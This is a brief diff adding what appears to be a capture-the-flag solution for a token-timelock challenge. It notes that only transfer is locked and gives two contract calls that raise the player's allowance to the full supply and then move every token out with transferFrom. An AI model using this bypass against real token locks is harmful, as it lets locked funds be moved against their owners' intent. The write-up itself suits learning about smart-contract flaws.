@@ -1,0 +1,8 @@
+
+Only transfer is blocked, not transferfrom
+
+Step1: Increase your allowance to INITIAL_SUPPLY
+contract.increaseAllowance(player, '1000000000000000000000000')
+
+Step2: Send all using transfer_from
+contract.transferFrom(player, '0xB5e94F589938C99eC98aDAF842d201B9cfcB29E9', '1000000000000000000000000')
